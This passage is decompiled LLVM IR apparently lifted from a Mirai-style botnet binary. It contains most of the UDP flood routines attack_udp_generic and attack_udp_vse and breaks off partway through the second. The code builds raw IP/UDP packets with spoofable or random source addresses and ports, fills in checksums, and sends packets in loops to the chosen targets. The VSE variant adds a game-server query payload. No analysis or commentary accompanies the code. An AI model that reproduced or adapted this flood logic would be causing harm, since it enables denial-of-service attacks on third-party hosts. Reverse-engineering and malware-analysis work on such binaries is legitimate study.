  store i16 %v8_10d80, i16* %v4_10d44, align 2
  %v3_10d94 = load i32, i32* %rfd_-108, align 4
  %v2_10da0 = mul i32 %v3_10d94, 24
  %v2_10dac = add i32 %v2_10da0, %targs
  %v1_10db4 = add i32 %v2_10c30, 22
  %v2_10db4 = inttoptr i32 %v1_10db4 to i16*
  %v3_10db4 = load i16, i16* %v2_10db4, align 2
  %v3_10db8 = add i32 %v2_10dac, 2
  %v4_10db8 = inttoptr i32 %v3_10db8 to i16*
  store i16 %v3_10db4, i16* %v4_10db8, align 2
  %v3_10dc4 = load i32, i32* %rfd_-108, align 4
  %v2_10dd0 = mul i32 %v3_10dc4, 24
  %v2_10ddc = add i32 %v2_10dd0, %targs
  %v6_10dfc = call i32 @__libc_sendto(i32 %v3_1049c, i32 %v2_10c30, i32 %v1_107e4, i32 16384, i32 %v2_10ddc, i32 16)
  %v3_10e00 = load i32, i32* %rfd_-108, align 4
  %v1_10e04 = add i32 %v3_10e00, 1
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10c9c
  %v3_10c1c = phi i32 [ 0, %dec_label_pc_10c10 ], [ %v1_10e04, %dec_label_pc_10c9c ]
  store i32 %v3_10c1c, i32* %rfd_-108, align 4
  %sext14 = mul i32 %v3_10c1c, 16777216
  %v9_10e18 = sdiv i32 %sext14, 16777216
  %v10_10e18 = icmp sgt i32 %tmp48, %v9_10e18
  br i1 %v10_10e18, label %dec_label_pc_10c1c, label %dec_label_pc_10c10

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10674, %entry, %dec_label_pc_104e8
  ret void

; uselistorder directives
  uselistorder i32 %v3_10c1c, { 0, 2, 1 }
  uselistorder i32 %v3_10cdc, { 1, 0 }
  uselistorder i32 %v2_10c30, { 4, 0, 5, 1, 2, 3, 6, 7, 8, 9, 10 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i8* %payload_-48.1, { 1, 0 }
  uselistorder i8* %v2_109e0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1050c, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_107e4, { 1, 2, 0 }
  uselistorder i8* %v2_106f8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1049c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_102c4, { 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %rfd_-108, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22 }
  uselistorder label %dec_label_pc_10e20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10c9c, { 1, 0 }
  uselistorder label %dec_label_pc_10c84, { 1, 0 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10bcc, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10500.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10bc0, { 1, 0 }
  uselistorder label %dec_label_pc_108fc, { 1, 0 }
  uselistorder label %dec_label_pc_10650, { 1, 0 }
  uselistorder label %dec_label_pc_10610, { 1, 0 }
}

define void @attack_udp_generic(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp23 = sext i8 %targs_len to i32
  %fd_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 69180, i32* %stack_var_-4, align 4
  %v2_10e38 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10e38, i32* @fp, align 4
  %v3_10e64 = call i32 @calloc(i32 %tmp23, i32 4)
  %v9_10e84 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_10e8c = trunc i32 %v9_10e84 to i8
  %v9_10ea8 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext2 = mul i32 %v9_10ea8, 65536
  %v1_10eac = sdiv i32 %sext2, 65536
  %v1_10eb0 = trunc i32 %v1_10eac to i16
  %v9_10ec8 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_10ed0 = trunc i32 %v9_10ec8 to i8
  %v9_10ee8 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 0)
  %sext4 = mul i32 %v9_10ee8, 16777216
  %v1_10eec = sdiv i32 %sext4, 16777216
  %v1_10ef0 = trunc i32 %v1_10eec to i8
  %v9_10f0c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %sext5 = mul i32 %v9_10f0c, 65536
  %v1_10f10 = sdiv i32 %sext5, 65536
  %v1_10f14 = trunc i32 %v1_10f10 to i16
  %v9_10f30 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext6 = mul i32 %v9_10f30, 65536
  %v1_10f34 = sdiv i32 %sext6, 65536
  %v1_10f38 = trunc i32 %v1_10f34 to i16
  %v9_10f50 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 512)
  %v9_10f70 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 1, i32 1)
  %sext7 = mul i32 %v9_10f70, 16777216
  %v1_10f74 = sdiv i32 %sext7, 16777216
  %v1_10f78 = trunc i32 %v1_10f74 to i8
  %v2_10f80 = load i32, i32* @LOCAL_ADDR, align 4
  %v9_10f9c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 25, i32 %v2_10f80)
  %tmp = icmp ult i32 %v9_10f50, 1461
  br i1 %tmp, label %dec_label_pc_10fc8, label %dec_label_pc_10fbc

dec_label_pc_10fbc:                               ; preds = %entry
  br label %dec_label_pc_10fc8

dec_label_pc_10fc8:                               ; preds = %entry, %dec_label_pc_10fbc
  %source_ip_-56.0 = phi i32 [ %v9_10f50, %entry ], [ 1460, %dec_label_pc_10fbc ]
  %v3_10fd4 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_10fe4 = icmp eq i32 %v3_10fd4, -1
  br i1 %v7_10fe4, label %dec_label_pc_1149c, label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fc8
  store i32 1, i32* %fd_-80, align 4
  %v2_10ff4 = ptrtoint i32* %fd_-80 to i32
  store i32 0, i32* @r1, align 4
  %v5_11010 = call i32 @__GI_setsockopt(i32 %v3_10fd4, i32 0, i32 3, i32 %v2_10ff4, i32 4)
  %v3_11018 = icmp eq i32 %v5_11010, -1
  br i1 %v3_11018, label %dec_label_pc_11020, label %dec_label_pc_11200.preheader

dec_label_pc_11200.preheader:                     ; preds = %dec_label_pc_10fec
  %v1_110e4 = add i32 %source_ip_-56.0, 28
  %v3_110ec = urem i32 %v1_110e4, 65536
  %v4_11108 = urem i32 %v1_10eac, 65536
  %v2_11134 = icmp eq i8 %v1_10ef0, 0
  %v4_11194 = urem i32 %v1_10f10, 65536
  %v4_111b0 = urem i32 %v1_10f34, 65536
  %v1_111d0 = add i32 %source_ip_-56.0, 8
  %v3_111d8 = urem i32 %v1_111d0, 65536
  br label %dec_label_pc_11200

dec_label_pc_11020:                               ; preds = %dec_label_pc_10fec
  %v1_11024 = call i32 @__GI___libc_close(i32 %v3_10fd4)
  br label %dec_label_pc_1149c

dec_label_pc_11038:                               ; preds = %dec_label_pc_11200
  %v3_1103c = mul i32 %v3_11038, 4
  %v2_11048 = add i32 %v3_1103c, %v3_10e64
  store i32 %v2_11048, i32* @r4, align 4
  %v2_11058 = call i32 @calloc(i32 1510, i32 1)
  %v1_11060 = load i32, i32* @r4, align 4
  %v2_11060 = inttoptr i32 %v1_11060 to i32*
  store i32 %v2_11058, i32* %v2_11060, align 4
  %v3_11064 = load i32, i32* %fd_-80, align 4
  %v3_11068 = mul i32 %v3_11064, 4
  %v2_11074 = add i32 %v3_11068, %v3_10e64
  %v1_11078 = inttoptr i32 %v2_11074 to i32*
  %v2_11078 = load i32, i32* %v1_11078, align 4
  %v5_1107c = inttoptr i32 %v2_11078 to i8*
  %v1_11084 = add i32 %v2_11078, 20
  store i8 69, i8* %v5_1107c, align 1
  %v3_110dc = add i32 %v2_11078, 1
  %v4_110dc = inttoptr i32 %v3_110dc to i8*
  store i8 %v1_10e8c, i8* %v4_110dc, align 1
  %v1_110f4 = call i32 @__GI_htons(i32 %v3_110ec)
  %sext10 = mul i32 %v1_110f4, 65536
  %v1_110f8 = sdiv i32 %sext10, 65536
  %v1_11104 = trunc i32 %v1_110f8 to i16
  %v3_11104 = add i32 %v2_11078, 2
  %v4_11104 = inttoptr i32 %v3_11104 to i16*
  store i16 %v1_11104, i16* %v4_11104, align 2
  %v1_11110 = call i32 @__GI_htons(i32 %v4_11108)
  %v1_11120 = trunc i32 %v1_11110 to i16
  %v3_11120 = add i32 %v2_11078, 4
  %v4_11120 = inttoptr i32 %v3_11120 to i16*
  store i16 %v1_11120, i16* %v4_11120, align 2
  %v3_1112c = add i32 %v2_11078, 8
  %v4_1112c = inttoptr i32 %v3_1112c to i8*
  store i8 %v1_10ed0, i8* %v4_1112c, align 1
  br i1 %v2_11134, label %dec_label_pc_11154, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11038
  %v1_11140 = call i32 @__GI_htons(i32 16384)
  %sext12 = mul i32 %v1_11140, 65536
  %v1_11144 = sdiv i32 %sext12, 65536
  %v1_11150 = trunc i32 %v1_11144 to i16
  %v3_11150 = add i32 %v2_11078, 6
  %v4_11150 = inttoptr i32 %v3_11150 to i16*
  store i16 %v1_11150, i16* %v4_11150, align 2
  br label %dec_label_pc_11154

dec_label_pc_11154:                               ; preds = %dec_label_pc_11038, %dec_label_pc_1113c
  %v3_1115c = add i32 %v2_11078, 9
  %v4_1115c = inttoptr i32 %v3_1115c to i8*
  store i8 17, i8* %v4_1115c, align 1
  %v2_11168 = add i32 %v2_11078, 12
  %v3_11168 = inttoptr i32 %v2_11168 to i32*
  store i32 %v9_10f9c, i32* %v3_11168, align 4
  %v3_1116c = load i32, i32* %fd_-80, align 4
  %v2_11178 = mul i32 %v3_1116c, 24
  %v2_11184 = add i32 %v2_11178, %targs
  %v1_11188 = add i32 %v2_11184, 16
  %v2_11188 = inttoptr i32 %v1_11188 to i32*
  %v3_11188 = load i32, i32* %v2_11188, align 4
  %v2_11190 = add i32 %v2_11078, 16
  %v3_11190 = inttoptr i32 %v2_11190 to i32*
  store i32 %v3_11188, i32* %v3_11190, align 4
  %v1_1119c = call i32 @__GI_htons(i32 %v4_11194)
  %sext13 = mul i32 %v1_1119c, 65536
  %v1_111a0 = sdiv i32 %sext13, 65536
  %v1_111ac = trunc i32 %v1_111a0 to i16
  %v3_111ac = inttoptr i32 %v1_11084 to i16*
  store i16 %v1_111ac, i16* %v3_111ac, align 2
  %v1_111b8 = call i32 @__GI_htons(i32 %v4_111b0)
  %sext14 = mul i32 %v1_111b8, 65536
  %v1_111bc = sdiv i32 %sext14, 65536
  %v1_111c8 = trunc i32 %v1_111bc to i16
  %v3_111c8 = add i32 %v2_11078, 22
  %v4_111c8 = inttoptr i32 %v3_111c8 to i16*
  store i16 %v1_111c8, i16* %v4_111c8, align 2
  %v1_111e0 = call i32 @__GI_htons(i32 %v3_111d8)
  %sext15 = mul i32 %v1_111e0, 65536
  %v1_111e4 = sdiv i32 %sext15, 65536
  %v1_111f0 = trunc i32 %v1_111e4 to i16
  %v3_111f0 = add i32 %v2_11078, 24
  %v4_111f0 = inttoptr i32 %v3_111f0 to i16*
  store i16 %v1_111f0, i16* %v4_111f0, align 2
  %v3_111f4 = load i32, i32* %fd_-80, align 4
  %v1_111f8 = add i32 %v3_111f4, 1
  br label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %dec_label_pc_11200.preheader, %dec_label_pc_11154
  %v3_11038 = phi i32 [ %v1_111f8, %dec_label_pc_11154 ], [ 0, %dec_label_pc_11200.preheader ]
  store i32 %v3_11038, i32* %fd_-80, align 4
  %sext8 = mul i32 %v3_11038, 16777216
  %v9_1120c = sdiv i32 %sext8, 16777216
  %v10_1120c = icmp sgt i32 %tmp23, %v9_1120c
  br i1 %v10_1120c, label %dec_label_pc_11038, label %dec_label_pc_11210.preheader

dec_label_pc_11210.preheader:                     ; preds = %dec_label_pc_11200
  %v3_112f4 = icmp eq i32 %v9_10f9c, -1
  %v3_11318 = icmp eq i16 %v1_10eb0, -1
  %v3_11344 = icmp eq i16 %v1_10f14, -1
  %v3_11370 = icmp eq i16 %v1_10f38, -1
  %v2_11394 = icmp eq i8 %v1_10f78, 0
  br label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_11488, %dec_label_pc_11210.preheader
  br label %dec_label_pc_11488

dec_label_pc_1121c:                               ; preds = %dec_label_pc_11488
  %v3_11220 = mul i32 %v3_11280, 4
  %v2_1122c = add i32 %v3_11220, %v3_10e64
  %v1_11230 = inttoptr i32 %v2_1122c to i32*
  %v2_11230 = load i32, i32* %v1_11230, align 4
  %v1_11244 = add i32 %v2_11230, 20
  %v4_11248 = inttoptr i32 %v1_11244 to i8*
  %v1_11250 = add i32 %v2_11230, 28
  %v4_11254 = inttoptr i32 %v1_11250 to i8*
  %v2_11264 = mul i32 %v3_11280, 24
  %v2_11270 = add i32 %v2_11264, %targs
  %v1_11274 = add i32 %v2_11270, 20
  %v2_11274 = inttoptr i32 %v1_11274 to i8*
  %v3_11274 = load i8, i8* %v2_11274, align 1
  %tmp57 = icmp ugt i8 %v3_11274, 31
  br i1 %tmp57, label %dec_label_pc_112f0, label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %dec_label_pc_1121c
  %v1_1129c = add i32 %v2_11270, 16
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  %v3_1129c = load i32, i32* %v2_1129c, align 4
  %v1_112a4 = call i32 @__GI_ntohl(i32 %v3_1129c)
  store i32 %v1_112a4, i32* @r4, align 4
  %v0_112ac = call i32 @rand_next()
  %v3_112b4 = load i32, i32* %fd_-80, align 4
  %v2_112c0 = mul i32 %v3_112b4, 24
  %v2_112cc = add i32 %v2_112c0, %targs
  %v1_112d0 = add i32 %v2_112cc, 20
  %v2_112d0 = inttoptr i32 %v1_112d0 to i8*
  %v3_112d0 = load i8, i8* %v2_112d0, align 1
  %v4_112d0 = zext i8 %v3_112d0 to i32
  %v6_112d4 = lshr i32 %v0_112ac, %v4_112d0
  %v0_112d8 = load i32, i32* @r4, align 4
  %v2_112d8 = add i32 %v0_112d8, %v6_112d4
  %v1_112e0 = call i32 @__GI_htonl(i32 %v2_112d8)
  %v2_112ec = add i32 %v2_11230, 16
  %v3_112ec = inttoptr i32 %v2_112ec to i32*
  store i32 %v1_112e0, i32* %v3_112ec, align 4
  br label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_1121c, %dec_label_pc_11280
  br i1 %v3_112f4, label %dec_label_pc_112fc, label %dec_label_pc_1130c

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112f0
  %v0_112fc = call i32 @rand_next()
  %v2_11308 = add i32 %v2_11230, 12
  %v3_11308 = inttoptr i32 %v2_11308 to i32*
  store i32 %v0_112fc, i32* %v3_11308, align 4
  br label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112f0, %dec_label_pc_112fc
  br i1 %v3_11318, label %dec_label_pc_11320, label %dec_label_pc_11338

dec_label_pc_11320:                               ; preds = %dec_label_pc_1130c
  %v0_11320 = call i32 @rand_next()
  %v1_11334 = trunc i32 %v0_11320 to i16
  %v3_11334 = add i32 %v2_11230, 4
  %v4_11334 = inttoptr i32 %v3_11334 to i16*
  store i16 %v1_11334, i16* %v4_11334, align 2
  br label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_1130c, %dec_label_pc_11320
  br i1 %v3_11344, label %dec_label_pc_1134c, label %dec_label_pc_11364

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11338
  %v0_1134c = call i32 @rand_next()
  %v1_11360 = trunc i32 %v0_1134c to i16
  %v3_11360 = inttoptr i32 %v1_11244 to i16*
  store i16 %v1_11360, i16* %v3_11360, align 2
  br label %dec_label_pc_11364

dec_label_pc_11364:                               ; preds = %dec_label_pc_11338, %dec_label_pc_1134c
  br i1 %v3_11370, label %dec_label_pc_11378, label %dec_label_pc_11390

dec_label_pc_11378:                               ; preds = %dec_label_pc_11364
  %v0_11378 = call i32 @rand_next()
  %v1_1138c = trunc i32 %v0_11378 to i16
  %v3_1138c = add i32 %v2_11230, 22
  %v4_1138c = inttoptr i32 %v3_1138c to i16*
  store i16 %v1_1138c, i16* %v4_1138c, align 2
  br label %dec_label_pc_11390

dec_label_pc_11390:                               ; preds = %dec_label_pc_11364, %dec_label_pc_11378
  br i1 %v2_11394, label %dec_label_pc_113ac, label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11390
  call void @rand_str(i8* %v4_11254, i32 %source_ip_-56.0)
  br label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_11390, %dec_label_pc_1139c
  %v3_113b4 = add i32 %v2_11230, 10
  %v4_113b4 = inttoptr i32 %v3_113b4 to i16*
  store i16 0, i16* %v4_113b4, align 2
  %v1_113bc = inttoptr i32 %v2_11230 to i16*
  %v5_113c4 = call i16 @checksum_generic(i16* %v1_113bc, i32 20)
  store i16 %v5_113c4, i16* %v4_113b4, align 2
  %v3_113e0 = add i32 %v2_11230, 26
  %v4_113e0 = inttoptr i32 %v3_113e0 to i16*
  store i16 0, i16* %v4_113e0, align 2
  %v1_113e8 = add i32 %v2_11230, 24
  %v2_113e8 = inttoptr i32 %v1_113e8 to i16*
  %v3_113e8 = load i16, i16* %v2_113e8, align 2
  %v8_113fc = call i16 @checksum_tcpudp(i32 %v2_11230, i8* %v4_11248, i16 %v3_113e8, i32 %v1_111d0)
  store i16 %v8_113fc, i16* %v4_113e0, align 2
  %v3_11410 = load i32, i32* %fd_-80, align 4
  %v2_1141c = mul i32 %v3_11410, 24
  %v2_11428 = add i32 %v2_1141c, %targs
  %v1_11430 = add i32 %v2_11230, 22
  %v2_11430 = inttoptr i32 %v1_11430 to i16*
  %v3_11430 = load i16, i16* %v2_11430, align 2
  %v3_11434 = add i32 %v2_11428, 2
  %v4_11434 = inttoptr i32 %v3_11434 to i16*
  store i16 %v3_11430, i16* %v4_11434, align 2
  %v3_11440 = load i32, i32* %fd_-80, align 4
  %v2_1144c = mul i32 %v3_11440, 24
  %v2_11458 = add i32 %v2_1144c, %targs
  %v6_11478 = call i32 @__libc_sendto(i32 %v3_10fd4, i32 %v2_11230, i32 %v1_110e4, i32 16384, i32 %v2_11458, i32 16)
  %v3_1147c = load i32, i32* %fd_-80, align 4
  %v1_11480 = add i32 %v3_1147c, 1
  br label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %dec_label_pc_11210, %dec_label_pc_113ac
  %v3_11280 = phi i32 [ 0, %dec_label_pc_11210 ], [ %v1_11480, %dec_label_pc_113ac ]
  store i32 %v3_11280, i32* %fd_-80, align 4
  %sext9 = mul i32 %v3_11280, 16777216
  %v9_11494 = sdiv i32 %sext9, 16777216
  %v10_11494 = icmp sgt i32 %tmp23, %v9_11494
  br i1 %v10_11494, label %dec_label_pc_1121c, label %dec_label_pc_11210

dec_label_pc_1149c:                               ; preds = %dec_label_pc_10fc8, %dec_label_pc_11020
  ret void

; uselistorder directives
  uselistorder i32 %v3_11280, { 0, 3, 1, 2 }
  uselistorder i32 %v2_11230, { 5, 1, 6, 2, 3, 7, 8, 0, 9, 10, 4, 11, 12 }
  uselistorder i32 %v3_11038, { 0, 2, 1 }
  uselistorder i32 %v1_111d0, { 1, 0 }
  uselistorder i32 %v1_110e4, { 1, 0 }
  uselistorder i32 %v3_10fd4, { 2, 1, 3, 0 }
  uselistorder i32 %v9_10f50, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-80, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 10, 9 }
  uselistorder label %dec_label_pc_1149c, { 1, 0 }
  uselistorder label %dec_label_pc_11488, { 1, 0 }
  uselistorder label %dec_label_pc_113ac, { 1, 0 }
  uselistorder label %dec_label_pc_11390, { 1, 0 }
  uselistorder label %dec_label_pc_11364, { 1, 0 }
  uselistorder label %dec_label_pc_11338, { 1, 0 }
  uselistorder label %dec_label_pc_1130c, { 1, 0 }
  uselistorder label %dec_label_pc_112f0, { 1, 0 }
  uselistorder label %dec_label_pc_11200, { 1, 0 }
  uselistorder label %dec_label_pc_11154, { 1, 0 }
  uselistorder label %dec_label_pc_10fc8, { 1, 0 }
}

define void @attack_udp_vse(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp24 = sext i8 %targs_len to i32
  %fd_-76 = alloca i32, align 4
  %i_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 70840, i32* %stack_var_-4, align 4
  %v2_114b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_114b4, i32* @fp, align 4
  %v3_114e0 = call i32 @calloc(i32 %tmp24, i32 4)
  %v9_11500 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_11508 = trunc i32 %v9_11500 to i8
  %v9_11524 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext2 = mul i32 %v9_11524, 65536
  %v1_11528 = sdiv i32 %sext2, 65536
  %v1_1152c = trunc i32 %v1_11528 to i16
  %v9_11544 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_1154c = trunc i32 %v9_11544 to i8
  %v9_11564 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 0)
  %sext4 = mul i32 %v9_11564, 16777216
  %v1_11568 = sdiv i32 %sext4, 16777216
  %v1_1156c = trunc i32 %v1_11568 to i8
  %v9_11588 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %v9_115ac = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 27015)
  %sext5 = mul i32 %v9_115ac, 65536
  %v1_115b0 = sdiv i32 %sext5, 65536
  %v1_115b4 = trunc i32 %v1_115b0 to i16
  call void @table_unlock_val(i8 29)
  %v3_115cc = call i8* @table_retrieve_val(i32 29, i32* nonnull %i_-80)
  %v3_115e4 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_115f4 = icmp eq i32 %v3_115e4, -1
  br i1 %v7_115f4, label %dec_label_pc_11ab0, label %dec_label_pc_115fc

dec_label_pc_115fc:                               ; preds = %entry
  store i32 1, i32* %fd_-76, align 4
  %v2_11604 = ptrtoint i32* %fd_-76 to i32
  store i32 0, i32* @r1, align 4
  %v5_11620 = call i32 @__GI_setsockopt(i32 %v3_115e4, i32 0, i32 3, i32 %v2_11604, i32 4)
  %v3_11628 = icmp eq i32 %v5_11620, -1
  br i1 %v3_11628, label %dec_label_pc_11630, label %dec_label_pc_11858.preheader

dec_label_pc_11858.preheader:                     ; preds = %dec_label_pc_115fc
  %v4_11728 = urem i32 %v1_11528, 65536
  %v2_11754 = icmp eq i8 %v1_1156c, 0
  %v5_117b8 = urem i32 %v9_11588, 65536
  %v4_117d4 = urem i32 %v1_115b0, 65536
  br label %dec_label_pc_11858

dec_label_pc_11630:                               ; preds = %dec_label_pc_115fc
  %v1_11634 = call i32 @__GI___libc_close(i32 %v3_115e4)
  br label %dec_label_pc_11ab0

dec_label_pc_11648:                               ; preds = %dec_label_pc_11858
  %v3_1164c = mul i32 %v3_11648, 4
  %v2_11658 = add i32 %v3_1164c, %v3_114e0
  store i32 %v2_11658, i32* @r4, align 4
  %v2_11664 = call i32 @calloc(i32 128, i32 1)
  %v1_1166c = load i32, i32* @r4, align 4
  %v2_1166c = inttoptr i32 %v1_1166c to i32*
  store i32 %v2_11664, i32* %v2_1166c, align 4
  %v3_11670 = load i32, i32* %fd_-76, align 4
  %v3_11674 = mul i32 %v3_11670, 4
  %v2_11680 = add i32 %v3_11674, %v3_114e0
  %v1_11684 = inttoptr i32 %v2_11680 to i32*
  %v2_11684 = load i32, i32* %v1_11684, align 4
  %v5_11688 = inttoptr i32 %v2_11684 to i8*
  %v1_11690 = add i32 %v2_11684, 20
  %v1_1169c = add i32 %v2_11684, 28
  store i8 69, i8* %v5_11688, align 1
  %v3_116f4 = add i32 %v2_11684, 1
  %v4_116f4 = inttoptr i32 %v3_116f4 to i8*
  store i8 %v1_11508, i8* %v4_116f4, align 1
  %v3_116f8 = load i32, i32* %i_-80, align 4
  %fold = add i32 %v3_116f8, 32
  %v3_1170c = urem i32 %fold, 65536
  %v1_11714 = call i32 @__GI_htons(i32 %v3_1170c)
  %sext8 = mul i32 %v1_11714, 65536
  %v1_11718 = sdiv i32 %sext8, 65536
  %v1_11724 = trunc i32 %v1_11718 to i16
  %v3_11724 = add i32 %v2_11684, 2
  %v4_11724 = inttoptr i32 %v3_11724 to i16*
  store i16 %v1_11724, i16* %v4_11724, align 2
  %v1_11730 = call i32 @__GI_htons(i32 %v4_11728)
  %v1_11740 = trunc i32 %v1_11730 to i16
  %v3_11740 = add i32 %v2_11684, 4
  %v4_11740 = inttoptr i32 %v3_11740 to i16*
  store i16 %v1_11740, i16* %v4_11740, align 2
  %v3_1174c = add i32 %v2_11684, 8
  %v4_1174c = inttoptr i32 %v3_1174c to i8*
  store i8 %v1_1154c, i8* %v4_1174c, align 1
  br i1 %v2_11754, label %dec_label_pc_11774, label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %dec_label_pc_11648
  %v1_11760 = call i32 @__GI_htons(i32 16384)
  %sext10 = mul i32 %v1_11760, 65536
  %v1_11764 = sdiv i32 %sext10, 65536
  %v1_11770 = trunc i32 %v1_11764 to i16
  %v3_11770 = add i32 %v2_11684, 6
  %v4_11770 = inttoptr i32 %v3_11770 to i16*
  store i16 %v1_11770, i16* %v4_11770, align 2
  br label %dec_label_pc_11774

dec_label_pc_11774:                               ; preds = %dec_label_pc_11648, %dec_label_pc_1175c
  %v3_1177c = add i32 %v2_11684, 9
  %v4_1177c = inttoptr i32 %v3_1177c to i8*
  store i8 17, i8* %v4_1177c, align 1
  %v2_11784 = load i32, i32* @LOCAL_ADDR, align 4
  %v2_1178c = add i32 %v2_11684, 12
  %v3_1178c = inttoptr i32 %v2_1178c to i32*
  store i32 %v2_11784, i32* %v3_1178c, align 4
  %v3_11790 = load i32, i32* %fd_-76, align 4
  %v2_1179c = mul i32 %v3_11790, 24
  %v2_117a8 = add i32 %v2_1179c, %targs
  %v1_117ac = add i32 %v2_117a8, 16
  %v2_117ac = inttoptr i32 %v1_117ac to i32*
  %v3_117ac = load i32, i32* %v2_117ac, align 4
  %v2_117b4 = add i32 %v2_11684, 16
  %v3_117b4 = inttoptr i32 %v2_117b4 to i32*
  store i32 %v3_117ac, i32* %v3_117b4, align 4
  %v1_117c0 = call i32 @__GI_htons(i32 %v5_117b8)
  %sext11 = mul i32 %v1_117c0, 65536
  %v1_117c4 = sdiv i32 %sext11, 65536
  %v1_117d0 = trunc i32 %v1_117c4 to i16
  %v3_117d0 = inttoptr i32 %v1_11690 to i16*
  store i16 %v1_117d0, i16* %v3_117d0, align 2
  %v1_117dc = call i32 @__GI_htons(i32 %v4_117d4)
  %sext12 = mul i32 %v1_117dc, 65536
  %v1_117e0 = sdiv i32 %sext12, 65536
  %v1_117ec = trunc i32 %v1_117e0 to i16
  %v3_117ec = add i32 %v2_11684, 22
  %v4_117ec = inttoptr i32 %v3_117ec to i16*
  store i16 %v1_117ec, i16* %v4_117ec, align 2
  %v3_117f0 = load i32, i32* %i_-80, align 4
  %fold13 = add i32 %v3_117f0, 12
  %v3_11804 = urem i32 %fold13, 65536
  %v1_1180c = call i32 @__GI_htons(i32 %v3_11804)
  %v1_1181c = trunc i32 %v1_1180c to i16
  %v3_1181c = add i32 %v2_11684, 24
  %v4_1181c = inttoptr i32 %v3_1181c to i16*
  store i16 %v1_1181c, i16* %v4_1181c, align 2
  %v2_11828 = inttoptr i32 %v1_1169c to i32*
  store i32 -1, i32* %v2_11828, align 4
  %v1_11830 = add i32 %v2_11684, 32
  %v4_11834 = inttoptr i32 %v1_11830 to i8*
  %v3_11838 = load i32, i32* %i_-80, align 4
  call void @util_memcpy(i8* %v4_11834, i8* %v3_115cc, i32 %v3_11838)
  %v3_1184c = load i32, i32* %fd_-76, align 4
  %v1_11850 = add i32 %v3_1184c, 1
  br label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_11858.preheader, %dec_label_pc_11774
  %v3_11648 = phi i32 [ %v1_11850, %dec_label_pc_11774 ], [ 0, %dec_label_pc_11858.preheader ]
  store i32 %v3_11648, i32* %fd_-76, align 4
  %sext6 = mul i32 %v3_11648, 16777216
  %v9_11864 = sdiv i32 %sext6, 16777216
  %v10_11864 = icmp sgt i32 %tmp24, %v9_11864
  br i1 %v10_11864, label %dec_label_pc_11648, label %dec_label_pc_11868.preheader

dec_label_pc_11868.preheader:                     ; preds = %dec_label_pc_11858
  %v3_11948 = icmp eq i16 %v1_1152c, -1
  %v3_11974 = icmp eq i32 %v5_117b8, 65535
  %v3_119a0 = icmp eq i16 %v1_115b4, -1
  br label %dec_label_pc_11868

